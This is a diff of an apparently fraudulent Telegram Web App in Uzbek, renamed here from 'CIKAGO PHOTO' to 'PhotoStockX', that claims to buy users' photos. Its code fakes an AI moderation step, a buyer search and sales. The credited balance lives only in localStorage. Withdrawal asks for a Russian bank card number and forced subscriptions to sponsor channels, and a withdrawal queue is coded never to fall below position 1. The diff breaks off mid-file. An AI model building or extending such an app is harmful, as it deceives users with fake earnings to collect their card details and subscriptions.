@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CIKAGO PHOTO Web App</title>
+    <title>PhotoStockX Web App</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         tailwind.config = {
             theme: {
                 extend: {
-                    fontFamily: { sans: ['Inter', 'sans-serif'], },
+                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                     colors: {
-                        brand: { blue: '#3B82F6', lightBlue: '#60A5FA', darkBg: '#090D16', cardBg: '#111827', accent: '#10B981', }
+                        brand: { blue: '#3B82F6', lightBlue: '#60A5FA', accent: '#10B981' }
                     }
                 }
             }
@@ -41,6 +42,8 @@
                 <path d="M50,120 C50,80 70,50 100,50 C130,50 150,80 150,120 C150,150 130,170 100,170 C70,170 50,150 50,120 Z" fill="none" stroke="#3B82F6" stroke-width="4"/>
                 <circle cx="100" cy="120" r="15" fill="none" stroke="#60A5FA" stroke-width="3"/>
                 <text x="94" y="126" fill="#3B82F6" font-family="sans" font-size="18" font-weight="900">D</text>
+                <rect x="75" y="25" width="20" height="35" rx="3" fill="none" stroke="#10B981" stroke-width="3" transform="rotate(-15 85 42.5)"/>
+                <rect x="105" y="25" width="20" height="35" rx="3" fill="none" stroke="#10B981" stroke-width="3" transform="rotate(15 115 42.5)"/>
             </svg>
         </div>
 
@@ -51,12 +54,11 @@
                 </button>
                 <div class="flex items-center space-x-2">
                     <div class="w-8 h-8 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center font-bold text-white shadow-lg shadow-blue-500/20">
-                        C
+                        P
                     </div>
-                    <span class="font-bold text-lg tracking-wide text-white">CIKAGO <span class="text-brand-lightBlue">PHOTO</span></span>
+                    <span class="font-bold text-lg tracking-wide text-white">PhotoStock<span class="text-brand-lightBlue">X</span></span>
                 </div>
             </div>
-            
             <div class="flex items-center space-x-3">
                 <span class="text-xs bg-slate-800 text-slate-300 font-semibold px-2.5 py-1 rounded-full border border-slate-700/50 flex items-center gap-1">
                     <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span> Online
@@ -65,7 +67,6 @@
         </header>
 
         <main class="flex-1 px-4 py-4 overflow-y-auto mb-20 z-10">
-
             <div id="screen-profile" class="fade-in space-y-4">
                 <div class="bg-amber-950/30 border border-amber-800/30 rounded-2xl p-4 flex items-start space-x-3 text-amber-200">
                     <div class="bg-amber-500/20 p-2 rounded-xl text-amber-400 flex items-center justify-center shrink-0">
@@ -82,7 +83,6 @@
                         <span class="text-emerald-400 text-xs font-bold uppercase tracking-wider flex items-center gap-1">
                             <i class="fa-solid fa-hourglass-half animate-spin" style="animation-duration: 3s"></i> Yechib olish jarayonda
                         </span>
-                        <span class="text-slate-500 text-[10px]" id="withdraw-time-display">Bugun</span>
                     </div>
                     <div class="space-y-3">
                         <div class="flex justify-between items-center">
@@ -102,7 +102,7 @@
                 <div class="bg-slate-900/90 border border-slate-800/60 rounded-3xl p-5 shadow-xl relative overflow-hidden">
                     <div class="absolute top-0 right-0 w-32 h-32 bg-blue-600/10 rounded-full blur-2xl"></div>
                     <div class="flex items-center space-x-4 mb-4">
-                        <div class="w-12 h-12 rounded-2xl bg-gradient-to-tr from-slate-700 to-slate-800 flex items-center justify-center shadow-lg border border-slate-600">
+                        <div id="user-avatar-container" class="w-12 h-12 rounded-2xl bg-gradient-to-tr from-slate-700 to-slate-800 flex items-center justify-center shadow-lg border border-slate-600 overflow-hidden">
                             <i class="fa-solid fa-user text-xl text-slate-300"></i>
                         </div>
                         <div>
@@ -123,7 +123,7 @@
                             <span class="text-slate-200 text-xs font-bold" id="sold-photo-count">0 ta</span>
                         </div>
                         <div>
-                            <span class="text-slate-500 text-[10px] block mb-0.5">UMUMIY DAROMAD</span>
+                            <span class="text-slate-500 text-[10px] block mb-0.5">UMUMIYa DAROMAD</span>
                             <span class="text-brand-lightBlue text-xs font-extrabold" id="total-revenue">0 RUB</span>
                         </div>
                     </div>
@@ -154,7 +154,7 @@
                         <i class="fa-solid fa-cloud-arrow-up text-2xl"></i>
                     </div>
                     <p class="text-slate-200 text-xs font-semibold text-center">Rasmlarni tanlash uchun bosing</p>
-                    <p class="text-slate-500 text-[10px] mt-1">Sifatli suratlar yuqori narxlanadi (Maks. 15MB)</p>
+                    <p class="text-slate-500 text-[10px] mt-1">Maks. 15MB</p>
                     <div id="selected-photos-preview" class="grid grid-cols-4 gap-2 mt-4 w-full hidden" onclick="event.stopPropagation();"></div>
                 </div>
                 <button id="btn-submit-moderation" disabled onclick="startModeration()" class="w-full bg-slate-800 text-slate-500 font-bold py-4 px-6 rounded-2xl cursor-not-allowed transition duration-200">
@@ -171,17 +171,16 @@
                     </div>
                 </div>
                 <div class="text-center space-y-2 max-w-xs">
-                    <h2 class="text-xl font-extrabold text-white tracking-wider animate-pulse">Sun'iy Intellekt Tahlili...</h2>
-                    <p class="text-slate-400 text-xs leading-relaxed">Fotolar sifati, o'lchami va unikalligi tahlil qilinmoqda</p>
+                    <h2 class="text-xl font-extrabold text-white tracking-wider animate-pulse">Tahlil...</h2>
                 </div>
                 <div class="w-full max-w-xs bg-slate-900/60 border border-slate-800/40 rounded-2xl p-4 space-y-3">
                     <div class="flex items-center space-x-3 text-xs" id="mod-step-1">
                         <i class="fa-solid fa-circle-notch text-brand-lightBlue animate-spin" id="mod-step-1-icon"></i>
-                        <span class="text-slate-300" id="mod-step-1-text">Format tahlil qilinmoqda...</span>
+                        <span class="text-slate-300" id="mod-step-1-text">Format tahlili...</span>
                     </div>
                     <div class="flex items-center space-x-3 text-xs" id="mod-step-2">
                         <i class="fa-solid fa-circle text-slate-600" id="mod-step-2-icon"></i>
-                        <span class="text-slate-500" id="mod-step-2-text">Unikallik tahlili kutilmoqda...</span>
+                        <span class="text-slate-500" id="mod-step-2-text">Unikallik...</span>
                     </div>
                 </div>
             </div>
@@ -194,29 +193,20 @@
                 </div>
                 <div class="text-center space-y-2 max-w-xs">
                     <h2 class="text-xl font-extrabold text-white tracking-wider">Xaridor Qidirilmoqda...</h2>
-                    <p id="search-country-text" class="text-slate-300 text-xs h-10 leading-relaxed font-semibold">Mos keladigan fotostok fondlari tekshirilmoqda...</p>
-                </div>
-                <div class="w-40 h-40 rounded-full border border-blue-500/20 relative flex items-center justify-center bg-blue-500/5">
-                    <div class="absolute w-28 h-28 rounded-full border border-blue-500/30 animate-ping opacity-75"></div>
-                    <div class="w-12 h-12 rounded-full bg-brand-lightBlue/20 flex items-center justify-center text-brand-lightBlue">
-                        <i class="fa-solid fa-earth-americas text-xl animate-spin" style="animation-duration: 6s"></i>
-                    </div>
                 </div>
             </div>
 
             <div id="screen-offer" class="fade-in space-y-6 hidden">
                 <div class="bg-gradient-to-br from-slate-900 to-slate-950 border border-brand-lightBlue/20 rounded-3xl p-6 text-center space-y-6 shadow-2xl relative overflow-hidden">
-                    <div class="absolute -top-12 -left-12 w-24 h-24 bg-brand-lightBlue/10 rounded-full blur-xl"></div>
                     <span class="inline-flex items-center px-4 py-1.5 rounded-full text-xs font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 uppercase tracking-widest">Taklif Topildi</span>
                     <div class="space-y-2">
-                        <p class="text-slate-400 text-xs">Xaridor barcha rasmlaringizni ushbu narxda sotib olishga tayyor:</p>
+                        <p class="text-slate-400 text-xs">Xaridor ushbu narxda sotib olishga tayyor:</p>
                         <h1 class="text-3xl font-black text-white tracking-tight" id="offer-price-display">0 <span class="text-brand-lightBlue">RUB</span></h1>
-                        <p class="text-slate-500 text-[10px]">Xizmat haqi: 0% (Tashviqot hisobidan)</p>
                     </div>
                 </div>
                 <div class="grid grid-cols-2 gap-4">
-                    <button onclick="startSearch(true)" class="bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-800 font-bold py-4 px-3 rounded-2xl text-xs transition duration-200 active:scale-[0.98]">Yangi xaridor qidirish</button>
-                    <button onclick="acceptOffer()" class="bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-3 rounded-2xl text-xs shadow-lg shadow-blue-500/20 transition duration-200 active:scale-[0.98]">Taklifni qabul qilish</button>
+                    <button onclick="startSearch()" class="bg-slate-900 text-slate-200 border border-slate-800 font-bold py-4 px-3 rounded-2xl text-xs">Yangi qidirish</button>
+                    <button onclick="changeScreen('screen-sold')" class="bg-brand-blue text-white font-bold py-4 px-3 rounded-2xl text-xs">Qabul qilish</button>
                 </div>
             </div>
 
@@ -225,120 +215,103 @@
                     <div class="w-20 h-20 rounded-full bg-emerald-500/10 flex items-center justify-center border border-emerald-500/20 text-emerald-400">
                         <i class="fa-solid fa-camera-retro text-3xl"></i>
                     </div>
-                    <span class="absolute text-lg -top-2 left-1/3 animate-bounce">✨</span>
-                    <span class="absolute text-lg top-8 right-1/3 animate-pulse">💰</span>
                 </div>
                 <div class="space-y-2 max-w-sm">
                     <h2 class="text-2xl font-extrabold text-white tracking-tight">Fotolaringiz Sotildi!</h2>
-                    <p class="text-slate-400 text-xs leading-relaxed px-4">Tranzaksiya muvaffaqiyatli yakunlandi. Mablag'lar darhol ichki balansingizga qo'shildi.</p>
+                    <p class="text-slate-400 text-xs px-4">Mablag'lar darhol ichki balansingizga qo'shildi.</p>
                 </div>
-                <button onclick="goToProfileAfterSale()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/20 transition duration-200 active:scale-[0.98]">Profilga o'tish</button>
+                <button onclick="goToProfileAfterSale()" class="w-full bg-brand-blue text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition">Profilga o'tish</button>
             </div>
 
             <div id="screen-withdraw-options" class="fade-in space-y-4 hidden">
                 <div class="py-2">
                     <h2 class="text-2xl font-extrabold text-white tracking-tight">Chiqarish usuli</h2>
-                    <p class="text-slate-400 text-xs mt-1">Rossiya bank kartalariga pulingizni yechib oling</p>
                 </div>
 
-                <div onclick="selectWithdrawMethod('Tinkoff')" class="bg-slate-900/60 hover:bg-slate-900 hover:border-slate-700 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between cursor-pointer transition duration-200 active:scale-[0.99] group mt-3">
+                <div onclick="selectWithdrawMethod('Tinkoff')" class="bg-slate-900/60 hover:bg-slate-900 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between cursor-pointer transition">
                     <div class="flex items-center space-x-4">
                         <div class="w-12 h-12 rounded-xl bg-yellow-500/15 text-yellow-400 border border-yellow-500/20 flex items-center justify-center font-black text-lg">T</div>
-                        <div>
-                            <h4 class="font-bold text-white text-sm group-hover:text-brand-lightBlue transition">Tinkoff Bank</h4>
-                            <p class="text-slate-500 text-[10px] mt-0.5">Rossiyaning barcha bank kartalariga</p>
-                        </div>
+                        <div><h4 class="font-bold text-white text-sm">Tinkoff Bank</h4></div>
                     </div>
-                    <i class="fa-solid fa-chevron-right text-slate-500 text-xs group-hover:translate-x-1 transition"></i>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-xs"></i>
                 </div>
 
-                <div onclick="selectWithdrawMethod('BTB')" class="bg-slate-900/60 hover:bg-slate-900 hover:border-slate-700 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between cursor-pointer transition duration-200 active:scale-[0.99] group mt-3">
+                <div onclick="selectWithdrawMethod('BTB')" class="bg-slate-900/60 hover:bg-slate-900 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between cursor-pointer transition">
                     <div class="flex items-center space-x-4">
                         <div class="w-12 h-12 rounded-xl bg-blue-500/15 text-blue-400 border border-blue-500/20 flex items-center justify-center font-black text-lg">B</div>
-                        <div>
-                            <h4 class="font-bold text-white text-sm group-hover:text-brand-lightBlue transition">BTB Rossiya Banki</h4>
-                            <p class="text-slate-500 text-[10px] mt-0.5">Tezkor xalqaro hisob-kitoblar</p>
-                        </div>
+                        <div><h4 class="font-bold text-white text-sm">BTB Rossiya Banki</h4></div>
                     </div>
-                    <i class="fa-solid fa-chevron-right text-slate-500 text-xs group-hover:translate-x-1 transition"></i>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-xs"></i>
                 </div>
 
-                <div onclick="selectWithdrawMethod('Sberbank')" class="bg-slate-900/60 hover:bg-slate-900 hover:border-slate-700 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between cursor-pointer transition duration-200 active:scale-[0.99] group mt-3">
+                <div onclick="selectWithdrawMethod('Sberbank')" class="bg-slate-900/60 hover:bg-slate-900 border border-slate-800/80 rounded-2xl p-4 flex items-center justify-between cursor-pointer transition">
                     <div class="flex items-center space-x-4">
                         <div class="w-12 h-12 rounded-xl bg-green-500/15 text-green-400 border border-green-500/20 flex items-center justify-center font-black text-lg">S</div>
-                        <div>
-                            <h4 class="font-bold text-white text-sm group-hover:text-brand-lightBlue transition">Sberbank</h4>
-                            <p class="text-slate-500 text-[10px] mt-0.5">Eng ommabop va tezkor o'tkazmalar</p>
-                        </div>
+                        <div><h4 class="font-bold text-white text-sm">Sberbank</h4></div>
                     </div>
-                    <i class="fa-solid fa-chevron-right text-slate-500 text-xs group-hover:translate-x-1 transition"></i>
+                    <i class="fa-solid fa-chevron-right text-slate-500 text-xs"></i>
                 </div>
             </div>
 
             <div id="screen-payment-details" class="fade-in space-y-6 hidden">
                 <div class="py-2">
                     <h2 class="text-2xl font-extrabold text-white tracking-tight">To'lov ma'lumotlari</h2>
-                    <p class="text-slate-400 text-xs mt-1">Pul o'tkaziladigan kartaning 16 xonali raqamini aniq va xatosiz kiriting</p>
                 </div>
                 <div class="bg-slate-900/80 border border-slate-800 rounded-3xl p-5 space-y-4">
                     <div class="space-y-1.5">
-                        <label id="input-label-primary" class="text-slate-400 text-[10px] font-semibold uppercase tracking-wider block">KARTA RAQAMI (16 RAQAM)</label>
+                        <label id="input-label-primary" class="text-slate-400 text-[10px] font-semibold uppercase block">KARTA RAQAMI</label>
                         <div class="relative">
-                            <input type="text" id="card-number-input" placeholder="0000 0000 0000 0000" maxlength="19" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3.5 text-slate-200 text-sm font-mono tracking-wider focus:outline-none focus:ring-2 focus:ring-brand-blue/50 placeholder:text-slate-700">
-                            <div class="absolute inset-y-0 right-0 flex items-center pr-4 text-slate-500">
-                                <i id="input-card-icon" class="fa-solid fa-credit-card"></i>
-                            </div>
+                            <input type="text" id="card-number-input" placeholder="0000 0000 0000 0000" maxlength="19" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3.5 text-slate-200 text-sm font-mono tracking-wider focus:outline-none focus:ring-2 focus:ring-brand-blue/50">
                         </div>
-                        <span class="text-slate-500 text-[10px] block">Karta egasining ismini yozish shart emas. Faqat Rossiya kartalari qabul qilinadi.</span>
                     </div>
                 </div>
-                <button onclick="confirmWithdrawal()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/20 transition duration-200 active:scale-[0.98]">Chiqarishni tasdiqlash</button>
+                <button onclick="confirmWithdrawal()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition">Tasdiqlash</button>
             </div>
 
             <div id="screen-sponsors" class="fade-in space-y-6 hidden">
                 <div class="text-center space-y-2 py-2">
                     <h2 class="text-2xl font-black text-white tracking-tight uppercase">Obunani Tasdiqlash</h2>
-                    <p class="text-slate-400 text-xs">Mablag'ni kartaga o'tkazish uchun homiy kanallarimizga obuna bo'lishingiz shart.</p>
+                    <p class="text-slate-400 text-xs">Mablag'ni o'tkazish uchun homiy kanallarimizga obuna bo'lishingiz shart.</p>
                 </div>
-                <div class="space-y-3" id="sponsor-channels-container">
-                    </div>
-                <button onclick="verifyAllSubscriptions()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/20 transition duration-200 active:scale-[0.98]">Men obuna bo'ldim</button>
+                <div class="space-y-3" id="sponsor-channels-container"></div>
+                <button onclick="verifyAllSubscriptions()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition">Men obuna bo'ldim</button>
             </div>
         </main>
 
         <footer id="main-footer" class="bg-slate-950/95 backdrop-blur-md border-t border-slate-900 py-2.5 px-6 grid grid-cols-3 gap-1 fixed bottom-0 max-w-md w-full z-50">
-            <button onclick="changeScreen('screen-profile')" id="nav-btn-home" class="flex flex-col items-center justify-center space-y-1 text-brand-lightBlue transition group">
-                <i class="fa-solid fa-user text-lg group-hover:scale-110 transition"></i>
-                <span class="text-[9px] font-medium">Profil</span>
+            <button onclick="changeScreen('screen-profile')" id="nav-btn-home" class="flex flex-col items-center justify-center space-y-1 text-brand-lightBlue transition">
+                <i class="fa-solid fa-user text-lg"></i><span class="text-[9px] font-medium">Profil</span>
             </button>
-            <button onclick="changeScreen('screen-upload')" id="nav-btn-upload" class="flex flex-col items-center justify-center space-y-1 text-slate-400 hover:text-white transition group">
-                <i class="fa-solid fa-cloud-arrow-up text-lg group-hover:scale-110 transition"></i>
-                <span class="text-[9px] font-medium">Foto Yuklash</span>
+            <button onclick="changeScreen('screen-upload')" id="nav-btn-upload" class="flex flex-col items-center justify-center space-y-1 text-slate-400 hover:text-white transition">
+                <i class="fa-solid fa-cloud-arrow-up text-lg"></i><span class="text-[9px] font-medium">Foto Yuklash</span>
             </button>
-            <button onclick="changeScreen('screen-withdraw-options')" id="nav-btn-withdraw" class="flex flex-col items-center justify-center space-y-1 text-slate-400 hover:text-white transition group">
-                <i class="fa-solid fa-wallet text-lg group-hover:scale-110 transition"></i>
-                <span class="text-[9px] font-medium">Pul Chiqarish</span>
+            <button onclick="changeScreen('screen-withdraw-options')" id="nav-btn-withdraw" class="flex flex-col items-center justify-center space-y-1 text-slate-400 hover:text-white transition">
+                <i class="fa-solid fa-wallet text-lg"></i><span class="text-[9px] font-medium">Pul Chiqarish</span>
             </button>
         </footer>
 
         <div id="custom-modal" class="fixed inset-0 bg-neutral-950/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4 hidden">
-            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 max-w-xs w-full text-center space-y-4 shadow-2xl scale-95 transition-all duration-300 transform" id="modal-content">
+            <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 max-w-xs w-full text-center space-y-4 shadow-2xl" id="modal-content">
                 <div id="modal-icon-container" class="w-12 h-12 rounded-2xl flex items-center justify-center mx-auto text-xl"></div>
                 <div class="space-y-1.5">
                     <h3 id="modal-title" class="text-base font-bold text-white">Sarlavha</h3>
-                    <p id="modal-desc" class="text-slate-400 text-xs leading-relaxed">Xabar mazmuni shu yerda bo'ladi.</p>
+                    <p id="modal-desc" class="text-slate-400 text-xs">Xabar</p>
                 </div>
-                <button onclick="closeModal()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-3 px-4 rounded-xl text-xs transition duration-150">OK</button>
+                <button onclick="closeModal()" class="w-full bg-brand-blue hover:bg-blue-600 text-white font-bold py-3 px-4 rounded-xl text-xs transition">OK</button>
             </div>
         </div>
     </div>
 
     <script>
-        // PULLI HOSTINGINGIZDAGI API MANZILI (Shuni to'g'irlab qo'ying)
+        // ==============================================
+        // ⚠️ BACKEND MANZILINI SHU YERGA YOZING
+        // ==============================================
         const BACKEND_URL = "https://www/6a397e698fb00.xvest5.ru/bot.php"; 
         
         let tgUserId = "12345678";
         let tgUserName = "Foydalanuvchi";
+
+        // TWA (Telegram Web App) integratsiyasi va Avatar olish
         try {
             if (window.Telegram && window.Telegram.WebApp) {
                 window.Telegram.WebApp.ready();
@@ -347,92 +320,62 @@
                 if (initData && initData.user) {
                     tgUserId = initData.user.id.toString();
                     tgUserName = initData.user.first_name || initData.user.username || "Foydalanuvchi";
+                    
+                    // Rasm mavjud bo'lsa uni yuklaymiz
+                    if(initData.user.photo_url) {
+                        const avatarDiv = document.getElementById('user-avatar-container');
+                        if(avatarDiv) {
+                            avatarDiv.innerHTML = `<img src="${initData.user.photo_url}" class="w-full h-full object-cover rounded-2xl">`;
+                        }
+                    }
                 }
             }
-        } catch(e) {
-            console.log("Telegram WebApp context yuklanmadi, test rejimida ishga tushdi.");
-        }
+        } catch(e) { console.log("Test rejim"); }
 
         let appState = {
-            balance: 0,
-            soldPhotos: 0,
-            totalEarnings: 0,
-            selectedPhotoCount: 0,
-            pendingOffer: 0,
-            currentWithdrawMethod: 'Tinkoff',
-            history: ['screen-profile'],
-            dynamicChannels: [],
-            withdrawPending: false,
-            withdrawAmount: 0,
-            queuePosition: 0
+            balance: 0, soldPhotos: 0, totalEarnings: 0,
+            selectedPhotoCount: 0, pendingOffer: 0, currentWithdrawMethod: 'Tinkoff',
+            history: ['screen-profile'], dynamicChannels: [], withdrawPending: false, withdrawAmount: 0, queuePosition: 0
         };
 
         const backBtn = document.getElementById('back-btn');
-        const balanceAmount = document.getElementById('balance-amount');
-        const soldPhotoCount = document.getElementById('sold-photo-count');
-        const totalRevenue = document.getElementById('total-revenue');
-        const selectedCountLabel = document.getElementById('selected-count-label');
-        const uploadZone = document.getElementById('upload-zone');
-        const btnSubmitModeration = document.getElementById('btn-submit-moderation');
-        const previewGrid = document.getElementById('selected-photos-preview');
-        const withdrawStatusCard = document.getElementById('withdraw-status-card');
-
         const themes = [
-            { class: 'bg-theme-1', svg: `<path d="M50,120 C50,80 70,50 100,50 C130,50 150,80 150,120 C150,150 130,170 100,170 C70,170 50,150 50,120 Z" fill="none" stroke="#3B82F6" stroke-width="4"/><circle cx="100" cy="120" r="15" fill="none" stroke="#60A5FA" stroke-width="3"/><text x="94" y="126" fill="#3B82F6" font-family="sans" font-size="18" font-weight="900">C</text>` },
-            { class: 'bg-theme-2', svg: `<rect x="40" y="60" width="120" height="70" rx="8" fill="none" stroke="#10B981" stroke-width="4" transform="rotate(-10 100 95)"/><circle cx="100" cy="95" r="18" fill="none" stroke="#34D399" stroke-width="3"/><line x1="70" y1="95" x2="130" y2="95" stroke="#10B981" stroke-width="3"/>` },
-            { class: 'bg-theme-3', svg: `<path d="M60,140 C60,100 80,70 100,70 C120,70 140,100 140,140 C140,160 120,170 100,170 C80,170 60,160 60,140 Z" fill="none" stroke="#F59E0B" stroke-width="4"/><path d="M90,70 L110,70" stroke="#F59E0B" stroke-width="5" stroke-linecap="round"/><text x="90" y="135" fill="#F59E0B" font-family="sans" font-size="30" font-weight="900">$</text>` }
+            { class: 'bg-theme-1', svg: `<path d="M50,120 C50,80 70,50 100,50 C130,50 150,80 150,120 C150,150 130,170 100,170 C70,170 50,150 50,120 Z" fill="none" stroke="#3B82F6" stroke-width="4"/><circle cx="100" cy="120" r="15" fill="none" stroke="#60A5FA" stroke-width="3"/><text x="94" y="126" fill="#3B82F6" font-family="sans" font-size="18" font-weight="900">D</text>` },
+            { class: 'bg-theme-2', svg: `<rect x="40" y="60" width="120" height="70" rx="8" fill="none" stroke="#10B981" stroke-width="4" transform="rotate(-10 100 95)"/><circle cx="100" cy="95" r="18" fill="none" stroke="#34D399" stroke-width="3"/><line x1="70" y1="95" x2="130" y2="95" stroke="#10B981" stroke-width="3"/>` }
         ];
         let currentThemeIndex = 0;
 
         setInterval(() => {
             currentThemeIndex = (currentThemeIndex + 1) % themes.length;
-            const container = document.getElementById('app-container');
-            const svgContainer = document.getElementById('bg-vector-container');
-            container.className = `w-full max-w-md bg-transition ${themes[currentThemeIndex].class} min-h-screen flex flex-col justify-between relative shadow-2xl overflow-hidden border-x border-slate-800/40`;
-            svgContainer.style.opacity = 0;
-            setTimeout(() => {
-                svgContainer.innerHTML = `<svg class="w-72 h-72 block" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">${themes[currentThemeIndex].svg}</svg>`;
-                svgContainer.style.opacity = 0.15;
-            }, 500);
+            document.getElementById('app-container').className = `w-full max-w-md bg-transition ${themes[currentThemeIndex].class} min-h-screen flex flex-col justify-between relative shadow-2xl overflow-hidden border-x border-slate-800/40`;
         }, 60000);
 
-        function formatRubles(num) {
-            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ") + " RUB";
-        }
+        function formatRubles(num) { return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ") + " RUB"; }
 
         window.addEventListener('DOMContentLoaded', () => {
             document.getElementById('user-tg-name').innerText = tgUserName;
             document.getElementById('user-tg-id').innerText = `ID: ${tgUserId}`;
-            
             loadLocalState();
             fetchSponsorChannels();
             
-            const cardInput = document.getElementById('card-number-input');
-            cardInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                let formatted = '';
-                for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) formatted += ' ';
-                    formatted += value[i];
-                }
-                e.target.value = formatted;
+            document.getElementById('card-number-input').addEventListener('input', (e) => {
+                let v = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let f = '';
+                for (let i=0; i<v.length; i++) { if (i>0 && i%4===0) f += ' '; f += v[i]; }
+                e.target.value = f;
             });
         });
 
         function saveLocalState() {
-            localStorage.setItem(`cikagophoto_state_${tgUserId}`, JSON.stringify({
-                balance: appState.balance,
-                soldPhotos: appState.soldPhotos,
-                totalEarnings: appState.totalEarnings,
-                withdrawPending: appState.withdrawPending,
-                withdrawAmount: appState.withdrawAmount,
-                queuePosition: appState.queuePosition
+            localStorage.setItem(`photostock_state_${tgUserId}`, JSON.stringify({
+                balance: appState.balance, soldPhotos: appState.soldPhotos, totalEarnings: appState.totalEarnings,
+                withdrawPending: appState.withdrawPending, withdrawAmount: appState.withdrawAmount, queuePosition: appState.queuePosition
             }));
             updateUI();
         }
 
         function loadLocalState() {
-            const cached = localStorage.getItem(`cikagophoto_state_${tgUserId}`);
+            const cached = localStorage.getItem(`photostock_state_${tgUserId}`);
             if (cached) {
                 const data = JSON.parse(cached);
                 appState.balance = data.balance ?? 0;
@@ -442,8 +385,9 @@
                 appState.withdrawAmount = data.withdrawAmount ?? 0;
                 
                 if (appState.withdrawPending) {
-                    const savedDate = localStorage.getItem(`cikagophoto_withdraw_date_${tgUserId}`);
+                    const savedDate = localStorage.getItem(`photostock_withdraw_date_${tgUserId}`);
                     if (savedDate) {
+                        // Navbat har 2 soatda bittaga kamayadi
                         const periodsPassed = Math.floor((Date.now() - parseInt(savedDate)) / (2 * 60 * 60 * 1000));
                         appState.queuePosition = Math.max(1, data.queuePosition - periodsPassed);
                     } else {
@@ -455,16 +399,16 @@
         }
 
         function updateUI() {
-            balanceAmount.innerText = formatRubles(appState.balance);
-            soldPhotoCount.innerText = appState.soldPhotos + " ta";
-            totalRevenue.innerText = formatRubles(appState.totalEarnings);
+            document.getElementById('balance-amount').innerText = formatRubles(appState.balance);
+            document.getElementById('sold-photo-count').innerText = appState.soldPhotos + " ta";
+            document.getElementById('total-revenue').innerText = formatRubles(appState.totalEarnings);
 
             if (appState.withdrawPending) {
-                withdrawStatusCard.classList.remove('hidden');
+                document.getElementById('withdraw-status-card').classList.remove('hidden');
                 document.getElementById('queue-amount-display').innerText = formatRubles(appState.withdrawAmount);
                 document.getElementById('queue-number-display').innerText = `${appState.queuePosition}-navbat`;
             } else {
-                withdrawStatusCard.classList.add('hidden');
+                document.getElementById('withdraw-status-card').classList.add('hidden');
             }
         }
 
@@ -479,12 +423,12 @@
                         appState.dynamicChannels = data.channels;
                         renderChannels();
                     } else {
-                        container.innerHTML = `<div class="text-center py-4 text-emerald-500 text-xs font-bold">Ayni vaqtda majburiy obuna kanallari mavjud emas.</div>`;
+                        container.innerHTML = `<div class="text-center py-4 text-emerald-500 text-xs font-bold">Ayni vaqtda majburiy obuna kanallari yo'q.</div>`;
                         appState.dynamicChannels = [];
                     }
                 })
                 .catch(() => {
-                    container.innerHTML = `<div class="text-center py-4 text-rose-500 text-xs">Server bilan aloqada xatolik yuz berdi.</div>`;
+                    container.innerHTML = `<div class="text-center py-4 text-rose-500 text-xs">Aloqa xatosi.</div>`;
                     appState.dynamicChannels = [];
                 });
         }
@@ -492,86 +436,72 @@
         function renderChannels() {
             const container = document.getElementById('sponsor-channels-container');
             container.innerHTML = '';
-            
             if (appState.dynamicChannels.length === 0) return;
 
             appState.dynamicChannels.forEach((chan) => {
-                const channelCard = document.createElement('div');
-                channelCard.className = "bg-slate-900/60 border border-slate-800/60 rounded-2xl p-4 flex items-center justify-between";
-                channelCard.innerHTML = `
+                const card = document.createElement('div');
+                card.className = "bg-slate-900/60 border border-slate-800/60 rounded-2xl p-4 flex items-center justify-between";
+                card.innerHTML = `
                     <div class="flex items-center space-x-3 overflow-hidden">
-                        <div class="w-10 h-10 shrink-0 rounded-full bg-gradient-to-tr from-brand-blue to-indigo-500 flex items-center justify-center text-white font-bold text-xs shadow-inner">
-                            ${chan.name.charAt(0)}
-                        </div>
+                        <div class="w-10 h-10 shrink-0 rounded-full bg-gradient-to-tr from-brand-blue to-indigo-500 flex items-center justify-center text-white font-bold text-xs shadow-inner">${chan.name.charAt(0)}</div>
                         <div class="truncate">
                             <h4 class="font-bold text-white text-xs truncate">${chan.name}</h4>
                             <p class="text-slate-500 text-[10px] truncate">${chan.type || 'Majburiy obuna'}</p>
                         </div>
                     </div>
-                    <a href="${chan.link}" target="_blank" class="bg-brand-blue hover:bg-blue-600 shrink-0 text-white font-bold text-[10px] py-2 px-3.5 rounded-xl transition duration-150">
-                        A'zo bo'lish
